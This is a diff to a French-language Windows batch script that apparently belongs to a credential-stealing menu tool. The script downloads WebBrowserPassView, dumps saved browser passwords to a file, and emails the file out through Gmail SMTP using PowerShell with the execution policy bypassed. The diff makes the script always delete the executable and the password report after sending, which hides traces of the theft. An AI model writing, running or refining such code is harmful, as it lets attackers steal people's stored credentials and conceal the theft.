@@ -784,14 +784,13 @@ if not exist "%WBPV%" (
   if not exist "%WBPV%" (
     echo Erreur: Telechargement echoue.
     pause
-    goto bpv_menu
+    goto sys_passwords_menu
   )
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
     pause
-    goto bpv_menu
+    goto sys_passwords_menu
   )
-  set "DOWNLOADED=1"
   timeout /t 1 /nobreak >nul
 )
 
@@ -817,14 +816,12 @@ timeout /t 2 /nobreak >nul
 
 if not exist "%OUTPUT%" (
   echo ERREUR: Le fichier n'a pas ete cree.
-  if "%DOWNLOADED%"=="1" (
-    del /F /Q "%WBPV%" >nul 2>&1
-    if exist "%WBPV%" (
-      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-    )
+  del /F /Q "%WBPV%" >nul 2>&1
+  if exist "%WBPV%" (
+    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
   )
   pause
-  goto bpv_menu
+  goto sys_passwords_menu
 )
 
 echo Fichier sauvegarde: %OUTPUT%
@@ -833,15 +830,13 @@ echo Envoi du fichier par email...
 
 powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 
 
-rem Nettoyage si telecharge
-if "%DOWNLOADED%"=="1" (
-  echo.
-  echo Nettoyage...
-  del /F /Q "%WBPV%" >nul 2>&1
-  if exist "%WBPV%" (
-    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-  )
+echo.
+echo Nettoyage de l'executable et du rapport...
+del /F /Q "%WBPV%" >nul 2>&1
+if exist "%WBPV%" (
+  powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 )
+del /F /Q "%OUTPUT%" >nul 2>&1
 
 echo.
 echo Fermeture automatique dans 2 secondes...
